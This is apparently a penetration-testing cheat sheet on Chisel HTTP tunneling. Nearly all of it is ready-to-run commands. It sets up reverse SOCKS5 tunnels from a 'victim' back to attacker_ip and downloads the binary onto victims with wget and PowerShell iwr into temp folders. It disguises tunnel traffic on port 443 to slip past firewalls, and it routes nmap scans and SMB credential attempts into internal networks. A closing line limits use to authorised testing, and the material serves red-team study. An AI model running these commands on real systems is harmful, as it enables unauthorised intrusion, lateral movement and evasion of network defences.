# Chisel Tunneling

HTTP-based tunneling with SOCKS5 support. Works when only HTTP/HTTPS egress is allowed.

## Download

```bash
# Attacker machine (Linux)
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
gunzip chisel_linux_amd64.gz && mv chisel_linux_amd64 chisel && chmod +x chisel

# For victim delivery — grab the correct arch binary (Linux or Windows)
# Windows: chisel_windows_amd64.exe
```

## Basic SOCKS5 Tunnel

```bash
# Attacker — start server with reverse support
./chisel server -p 8000 --reverse

# Victim — connect back and create SOCKS5 on attacker:1080
./chisel client attacker_ip:8000 R:socks
```

Now configure proxychains with `socks5 127.0.0.1 1080` and route all tools through it.

## Specific Port Forward

```bash
# Attacker server
./chisel server -p 8000 --reverse

# Victim — expose internal web server on attacker's port 8080
./chisel client attacker_ip:8000 R:8080:172.16.0.100:80

# Access it locally
curl http://localhost:8080
```

## Forward Mode (attacker initiates)

```bash
# Victim runs server
./chisel server -p 9000

# Attacker connects and creates local SOCKS5
./chisel client victim_ip:9000 socks
```

## Deliver Chisel to Victim

```bash
# Start HTTP server on attacker
python3 -m http.server 80

# On victim (Linux)
wget http://attacker_ip/chisel -O /tmp/chisel && chmod +x /tmp/chisel

# On victim (Windows PowerShell)
iwr http://attacker_ip/chisel.exe -OutFile C:\Windows\Temp\chisel.exe
```

## Firewall Bypass Options

```bash
# Run chisel over HTTPS (requires cert)
./chisel server -p 443 --reverse --tls-key key.pem --tls-cert cert.pem

# Use port 443 or 80 on attacker to blend with normal traffic
./chisel server -p 443 --reverse
```

## Combine with Proxychains

```bash
# /etc/proxychains4.conf
socks5  127.0.0.1  1080

# Tunnel nmap through chisel SOCKS
proxychains nmap -sT -Pn 172.16.0.0/24

# Tunnel nxc
proxychains nxc smb 172.16.0.100 -u admin -p pass
```

## Use Case

Best for: restricted egress (HTTP/HTTPS only), web-only DMZ hosts, when SSH is not available.
Chisel traffic looks like HTTP — harder to block than raw SSH tunnels.

Ethical note: only use on systems you own or have explicit written permission to test.
